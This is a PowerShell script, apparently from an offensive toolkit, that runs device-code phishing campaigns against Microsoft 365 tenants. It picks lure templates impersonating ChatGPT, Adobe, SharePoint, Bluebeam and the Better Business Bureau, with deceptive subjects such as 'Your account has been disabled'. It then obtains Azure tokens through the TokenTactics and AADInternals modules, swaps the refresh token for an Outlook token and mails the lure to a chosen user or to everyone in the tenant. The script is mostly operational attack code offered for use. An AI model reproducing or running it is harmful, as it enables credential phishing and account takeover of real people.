[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureHound,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$recon,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$azureAd,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$persistence,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [switch]$GraphRecon,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$targetUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$templateLink,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$template,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$templateUrl,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$messageContent, 
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$linkSubject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$ReplyUrl,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$AppName,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Scope,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$CaptureCode, # Generate a CaptureCode with roadtx , use it? Will try
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$DeviceCode # Generate a Code elsewhere, pass to templating module and replace.ps1


)

$firstUser = $targetUser 
if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}

$template = $template.Trim()

switch ($template) {
    "chatgpt" { 
        $templatePath = ".\Templates\chatgpt.htm"
        $subjects = @("ChatGPT wants you back.")
        break 
    }
    "bluebeam" { 
        $templatePath = ".\Templates\bluebeam.htm"
        $subjects = @(
            "A Bluebeam Cloud user has shared 'Big City Project: Key Details and Timeline' with you.",
            "A Bluebeam Cloud user has shared 'Progress Update' with you.",
            "A Bluebeam Cloud user has shared 'Performance Improvement Plan and General Guidelines.' with you."
        )
        break 
    }
    "blonde" { 
        $templatePath = ".\Templates\blonde.htm"
        $subjects = @("The Girls of Heavy Industry 2024.")
        break 
    }
    "fondo" { 
        $templatePath = ".\Templates\fondo.htm"
        $subjects = @("The Girls of Heavy Industry 2024.")
        break 
    }
    "bbb" { 
        $templatePath = ".\Templates\bbb.htm"
        $subjects = @("Better Business Bureau Service RE: CASE # 97843381")
        break 
    }
    "adobe" { 
        $templatePath = ".\Templates\adobe.htm"
        $subjects = @("An Adobe Cloud user has shared 'Invoice #18675309' with you.")
        break 
    }
    "sharepoint" { 
        $templatePath = ".\Templates\sharepoint.htm"
        $subjects = @("A Sharepoint user shared a confidential document with you")
        break 
    }
    "dcgovlink" { 
        $templatePath = ".\Templates\dcgovlink.htm"
        $subjects = @("$linkSubject")
        break 
    }
    "vista" { 
        $templatePath = ".\Templates\vista.htm"
        $subjects = @("A Vista user shared a confidential document with you")
        break 
    }
    default {
        Write-Host "No matching template found for '$template'."
        # Handle the case where no valid template is found
        # This could be either setting a default template or exiting the script
    }
}

Write-Output "$template template selected. Replacing code."
.\LinkReplace.ps1 -templateLink $templateLink -template $template

Write-Output "Sign in with your sender's account here. Template will be sent from this mailbox."
Write-Output "Sending phish."
if(!($subject)){ $subject = Get-Random -InputObject $subjects} 

# Check if AADInternals module is available
if (-not (Get-Module -Name AADInternals -ListAvailable)) {
    # Install the AADInternals module if it's not available
    Install-Module AADInternals -Force
    Write-Output "AADInternals module has been installed."
}

# Import the AADInternals module
Import-Module AADInternals -Force
Write-Output "AADInternals module has been imported."

# Check if TokenTactics module is available
if (!(Get-Module -ListAvailable -Name TokenTactics)) {
    # Download the latest TokenTactics zip if the module is not available
    Write-Output "TokenTactics not found, downloading latest version into current working directory."
    Invoke-WebRequest -Uri https://github.com/mellonaut/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip

    if (Test-Path -Path .\tokentactics) {
        Remove-Item -Path .\tokentactics -Recurse -Force
    }

    Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
    Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
    Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
}

# Import or re-import the TokenTactics module
Import-Module .\tokentactics\TokenTactics.psd1 -Force
Write-Output "TokenTactics module has been imported."

# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Invoke-ClearToken -Token All
    Write-Output "Clearing any previous tokens for a clean run."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $Token
}

if(!($response)){ Read-Host "Need to authenticate!"} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "Sending as $user "

### Phishing Message Content

$At=Invoke-RefreshToOutlookToken -domain $domain -refreshtoken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $At.access_token -RefreshToken $At.refresh_token

$messageContent = Get-Content .\templates\$template.htm
$teamsMessage = $messageContent

if ($targetUser) {
    if ($targetUser -eq "all") {
        $users = Get-Content ".\users.json"
        foreach ($user in $users) {
            Read-Host "Warning: This will will attempt to send your phishing message to every user in the tenant. Do you want to continue?"
            Write-Output "You like to party."
            Write-Output "Going wide."            
            Write-Output "Sending Outlook messages..."
            # Send-TeamsMessageWithRetry -Recipient $user.UserPrincipalName -Message $teamsMessage
            if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
            if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $user -Subject "Your account has been disabled" -Message $teamsMessage
        }
    } else {
        Write-Output "Sending Phishing email.."        
        # Send-TeamsMessageWithRetry -Recipient $targetUser -Message $teamsMessage
        $mailuser = $targetUser
        if(!($subject)){$subject = "Third-Party Consent for use of your company's intellectual property"}
        if(!($messageContent)) { $messageContent = "We have been trying to reach you regarding use of your company's work in our upcoming calendar, please review these forms if you have any concerns or wish to object usage of your logo, etc, etc"}
        Send-AADIntOutlookMessage -AccessToken $At.access_token -Recipient $mailUser -Subject $subject -Message $teamsMessage    
    }
} else {

    Write-Host "No Target user specified. No emails sent."
    
    }
